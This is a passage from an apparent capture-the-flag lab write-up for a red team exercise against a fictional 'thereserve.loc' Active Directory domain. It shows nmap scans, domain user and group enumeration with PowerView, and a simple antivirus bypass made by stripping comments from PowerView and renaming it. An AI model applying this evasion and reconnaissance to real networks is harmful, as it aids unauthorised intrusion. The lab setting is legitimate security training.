</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2012.png" alt="Untitled" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2013.png" alt="Untitled" /></p><p>We are now able to obtain the following flags:</p><ul><li><p><strong><em>Flag 1, Breaching the Perimeter</em></strong></p><li><p><strong><em>Flag 2, Breaching Active Directory</em></strong></p><li><p><strong><em>Flag 3, Foothold on Corporate Division Tier 2 Infrastructure</em></strong></p></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2014.png" alt="Untitled" /></p><h2 id="administrative-access-to-corporate-division-tier-2-infrastructure"><strong>Administrative access to Corporate Division Tier 2 Infrastructure</strong></h2><h3 id="enumeration"><strong>Enumeration</strong></h3><p><strong>From WRK1 Machine</strong></p><p><strong>NMAP</strong></p><p>Let’s check the open ports and available services for the WRK1 and WRK2 machines.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>nmap <span class="nt">-Pn</span> 10.200.x.21 <span class="nt">-T4</span> 
Host is up <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 995 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>nmap <span class="nt">-Pn</span> 10.200.x.21 <span class="nt">-T4</span> <span class="nt">-p22</span>,135,139,445,3389 <span class="nt">-A</span>    
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 2178e279d393eef9aa7094ec01b3a58f <span class="o">(</span>RSA<span class="o">)</span>
|   256 e0f7b667c993b5740f0a83ffef55c89a <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 bd830ce3b44f78f2e34a52033ca5ce58 <span class="o">(</span>ED25519<span class="o">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>WRK1.corp.thereserve.loc
| Not valid before: 2024-05-18T10:42:39
|_Not valid after:  2024-11-17T10:42:39
| rdp-ntlm-info: 
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: WRK1
|   DNS_Domain_Name: corp.thereserve.loc
|   DNS_Computer_Name: WRK1.corp.thereserve.loc
|   DNS_Tree_Name: thereserve.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-20T12:25:06+00:00
|_ssl-date: 2024-05-20T12:25:45+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
                                  
┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>nmap <span class="nt">-Pn</span> 10.200.x.22 <span class="nt">-T4</span> 
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-20 14:05 EET
Nmap scan report <span class="k">for </span>10.200.x.22
Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 994 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi

┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>nmap <span class="nt">-Pn</span> 10.200.x.22 <span class="nt">-T4</span> <span class="nt">-p22</span>,135,139,445,3389,5357 <span class="nt">-A</span>
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-20 14:23 EET
Nmap scan report <span class="k">for </span>10.200.x.22
Host is up <span class="o">(</span>0.31s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 e6f0fb5b24286813daddc55f674ebe4f <span class="o">(</span>RSA<span class="o">)</span>
|   256 93f58f4c3115fc8e38033ed5b71cedd3 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 563f8a33a41fdc119aa167a67df87618 <span class="o">(</span>ED25519<span class="o">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: WRK2
|   DNS_Domain_Name: corp.thereserve.loc
|   DNS_Computer_Name: WRK2.corp.thereserve.loc
|   DNS_Tree_Name: thereserve.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-20T12:23:30+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>WRK2.corp.thereserve.loc
| Not valid before: 2024-05-18T10:42:36
|_Not valid after:  2024-11-17T10:42:36
|_ssl-date: 2024-05-20T12:23:39+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0

Host script results:
| smb2-time: 
|   <span class="nb">date</span>: 2024-05-20T12:23:30
|_  start_date: N/A
|_clock-skew: mean: <span class="nt">-1s</span>, deviation: 0s, median: <span class="nt">-1s</span>
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
</pre></table></code></div></div><p><strong>Manual Enumeration</strong></p><p>Doing some manual enumeration have a better view about our pwned machines and users:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">hostname</span><span class="w">
</span><span class="n">WRK1</span><span class="w">
</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span><span class="n">corp\mohammad.ahmed</span><span class="w">
</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">mohammad.ahmed</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">processed</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">controller</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">corp.thereserve.loc.</span><span class="w">

</span><span class="n">User</span><span class="w"> </span><span class="nx">name</span><span class="w">                    </span><span class="nx">mohammad.ahmed</span><span class="w">
</span><span class="n">Full</span><span class="w"> </span><span class="nx">Name</span><span class="w">                    </span><span class="nx">Mohammad</span><span class="w"> </span><span class="nx">Ahmed</span><span class="w">
</span><span class="n">Comment</span><span class="w">
</span><span class="nx">User</span><span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/18/2023 9:28:25 AM
Password expires             Never
Password changeable          3/19/2023 9:28:25 AM
Password required            Yes
User may change password     Yes
Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/22/2024 11:18:43 AM
Logon hours allowed          All
Local Group Memberships
Global Group memberships     *Help Desk            *Domain Users
The command completed successfully.

PS C:\Users\mohammad.ahmed&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Users\mohammad.ahmed&gt; net group "Help Desk" /domain

Members
-------------------------------------------------------------------------------
ashley.chan              emily.harvey             keith.allen
laura.wood               mohammad.ahmed
The command completed successfully.
</span></pre></table></code></div></div><p><strong>PowerVeiw</strong></p><p>The normal enumeration method will not be sufficient for us to get as much info as we need. Powerview or the AD module should help us get more information. But the WRK1 and WRK2 machines have Windows Defender installed and enabled.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w">  </span><span class="nx">\\tsclient\share\PowerView.ps1</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">Operation</span><span class="w"> </span><span class="nx">did</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">complete</span><span class="w"> </span><span class="nx">successfully</span><span class="w"> </span><span class="nx">because</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">contains</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">virus</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">potentially</span><span class="w"> </span><span class="nx">unwanted</span><span class="w"> </span><span class="nx">software.</span><span class="w">
</span><span class="n">At</span><span class="w"> </span><span class="nx">line:1</span><span class="w"> </span><span class="nx">char:1</span><span class="w">
</span><span class="o">+</span><span class="w"> </span><span class="n">Import-Module</span><span class="w">  </span><span class="nx">\\tsclient\share\PowerView.ps1</span><span class="w">
</span><span class="o">+</span><span class="w"> </span><span class="n">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="nx">CategoryInfo</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">ObjectNotFound:</span><span class="w"> </span><span class="p">(:</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">Import</span><span class="nt">-Module</span><span class="p">],</span><span class="w"> </span><span class="nx">CommandNotFoundException</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="n">FullyQualifiedErrorId</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">CommandNotFoundException</span><span class="p">,</span><span class="nx">Microsoft.PowerShell.Commands.ImportModuleCommand</span><span class="w">

</span></pre></table></code></div></div><h3 id="av-evasion"><strong>AV Evasion</strong></h3><p>So I have tried a simple way to bypass it. Removing most of the comments in the file and changing the file name.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w">  </span><span class="nx">\\tsclient\share\notpv.ps1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-NetDomain</span><span class="w">
</span><span class="n">Forest</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">thereserve.loc</span><span class="w">
</span><span class="n">DomainControllers</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">CORPDC.corp.thereserve.loc</span><span class="p">}</span><span class="w">
</span><span class="n">Children</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="n">DomainMode</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">Windows2012R2Domain</span><span class="w">
</span><span class="n">DomainModeLevel</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">6</span><span class="w">
</span><span class="n">Parent</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">thereserve.loc</span><span class="w">
</span><span class="n">PdcRoleOwner</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">CORPDC.corp.thereserve.loc</span><span class="w">
</span><span class="n">RidRoleOwner</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">CORPDC.corp.thereserve.loc</span><span class="w">
</span><span class="n">InfrastructureRoleOwner</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">CORPDC.corp.thereserve.loc</span><span class="w">
</span><span class="n">Name</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">corp.thereserve.loc</span><span class="w">
</span></pre></table></code></div></div><p>And it worked. Let’s get some info.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre><td class="rouge-code"><pre><span class="c"># User Info</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">mohammad.ahmed</span><span class="w">
</span><span class="n">logoncount</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">22404</span><span class="w">
</span><span class="n">badpasswordtime</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">5/21/2024</span><span class="w"> </span><span class="nx">1:53:27</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">department</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">IT</span><span class="w">
</span><span class="n">objectclass</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">top</span><span class="p">,</span><span class="w"> </span><span class="nx">person</span><span class="p">,</span><span class="w"> </span><span class="nx">organizationalPerson</span><span class="p">,</span><span class="w"> </span><span class="nx">user</span><span class="p">}</span><span class="w">
</span><span class="n">displayname</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">Mohammad</span><span class="w"> </span><span class="nx">Ahmed</span><span class="w">
</span><span class="n">lastlogontimestamp</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">5/20/2024</span><span class="w"> </span><span class="nx">9:27:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">userprincipalname</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">mohammad.ahmed</span><span class="err">@</span><span class="nx">corp.thereserve.loc</span><span class="w">
</span><span class="n">name</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">Mohammad</span><span class="w"> </span><span class="nx">Ahmed</span><span class="w">
</span><span class="n">lockouttime</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">objectsid</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-170228521-1485475711-3199862024-2000</span><span class="w">
</span><span class="n">samaccountname</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">mohammad.ahmed</span><span class="w">
</span><span class="n">codepage</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">samaccounttype</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">USER_OBJECT</span><span class="w">
</span><span class="n">accountexpires</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">NEVER</span><span class="w">
</span><span class="n">countrycode</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">whenchanged</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">5/20/2024</span><span class="w"> </span><span class="nx">9:27:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">instancetype</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">4</span><span class="w">
</span><span class="n">usncreated</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">402524</span><span class="w">
</span><span class="n">objectguid</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">a35a91c9-a8e8-4fb3-8256-098572be22e4</span><span class="w">
</span><span class="n">sn</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">Ahmed</span><span class="w">
</span><span class="n">lastlogoff</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">1/1/1601</span><span class="w"> </span><span class="nx">12:00:00</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">objectcategory</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Person</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">distinguishedname</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Mohammad</span><span class="w"> </span><span class="nx">Ahmed</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Help</span><span class="w"> </span><span class="nx">Desk</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">IT</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">People</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">dscorepropagationdata</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="mi">3</span><span class="n">/20/2023</span><span class="w"> </span><span class="nx">5:01:14</span><span class="w"> </span><span class="nx">PM</span><span class="p">,</span><span class="w"> </span><span class="nx">1/1/1601</span><span class="w"> </span><span class="nx">12:00:01</span><span class="w"> </span><span class="nx">AM</span><span class="p">}</span><span class="w">
</span><span class="n">givenname</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">Mohammad</span><span class="w">
</span><span class="n">title</span><span class="w">                 </span><span class="p">:</span><span class="w"> </span><span class="nx">Help</span><span class="w"> </span><span class="nx">Desk</span><span class="w">
</span><span class="n">memberof</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Help</span><span class="w"> </span><span class="nx">Desk</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Groups</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">lastlogon</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">5/22/2024</span><span class="w"> </span><span class="nx">12:13:48</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">badpwdcount</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">cn</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">Mohammad</span><span class="w"> </span><span class="nx">Ahmed</span><span class="w">
</span><span class="n">useraccountcontrol</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">NORMAL_ACCOUNT</span><span class="p">,</span><span class="w"> </span><span class="nx">DONT_EXPIRE_PASSWORD</span><span class="w">
</span><span class="n">whencreated</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">2/18/2023</span><span class="w"> </span><span class="nx">6:26:02</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">primarygroupid</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">513</span><span class="w">
</span><span class="n">pwdlastset</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">3/18/2023</span><span class="w"> </span><span class="nx">9:28:25</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">usnchanged</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">1114213</span><span class="w">

</span><span class="c"># Group Info</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Help Desk'</span><span class="w">

</span><span class="n">usncreated</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">402676</span><span class="w">
</span><span class="n">grouptype</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">GLOBAL_SCOPE</span><span class="p">,</span><span class="w"> </span><span class="nx">SECURITY</span><span class="w">
</span><span class="n">samaccounttype</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">GROUP_OBJECT</span><span class="w">
</span><span class="n">samaccountname</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">Help</span><span class="w"> </span><span class="nx">Desk</span><span class="w">
</span><span class="n">whenchanged</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">2/18/2023</span><span class="w"> </span><span class="nx">6:35:23</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">objectsid</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-170228521-1485475711-3199862024-2005</span><span class="w">
</span><span class="n">objectclass</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">top</span><span class="p">,</span><span class="w"> </span><span class="nx">group</span><span class="p">}</span><span class="w">
</span><span class="n">cn</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">Help</span><span class="w"> </span><span class="nx">Desk</span><span class="w">
</span><span class="n">usnchanged</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">402700</span><span class="w">
</span><span class="n">dscorepropagationdata</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="mi">3</span><span class="n">/20/2023</span><span class="w"> </span><span class="nx">5:01:14</span><span class="w"> </span><span class="nx">PM</span><span class="p">,</span><span class="w"> </span><span class="nx">1/1/1601</span><span class="w"> </span><span class="nx">12:00:01</span><span class="w"> </span><span class="nx">AM</span><span class="p">}</span><span class="w">
</span><span class="n">memberof</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Internet</span><span class="w"> </span><span class="nx">Access</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Groups</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">distinguishedname</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Help</span><span class="w"> </span><span class="nx">Desk</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Groups</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">name</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">Help</span><span class="w"> </span><span class="nx">Desk</span><span class="w">
</span><span class="n">member</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">CN</span><span class="o">=</span><span class="n">Mohammad</span><span class="w"> </span><span class="nx">Ahmed</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Help</span><span class="w"> </span><span class="nx">Desk</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">IT</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">People</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="p">,</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Keith</span><span class="w"> </span><span class="nx">Allen</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Help</span><span class="w"> </span><span class="nx">Desk</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">IT</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">People</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="p">,</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Ashley</span><span class="w"> </span><span class="nx">Chan</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Help</span><span class="w"> </span><span class="nx">Desk</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">IT</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">People</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="p">,</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Emily</span><span class="w">
                        </span><span class="nx">Harvey</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Help</span><span class="w"> </span><span class="nx">Desk</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">IT</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">People</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc...</span><span class="p">}</span><span class="w">
</span><span class="n">whencreated</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">2/18/2023</span><span class="w"> </span><span class="nx">6:34:27</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">instancetype</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">4</span><span class="w">
</span><span class="n">objectguid</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">ef6d9255-1df6-480e-86f6-ae870f3e490b</span><span class="w">
</span><span class="n">objectcategory</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Group</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
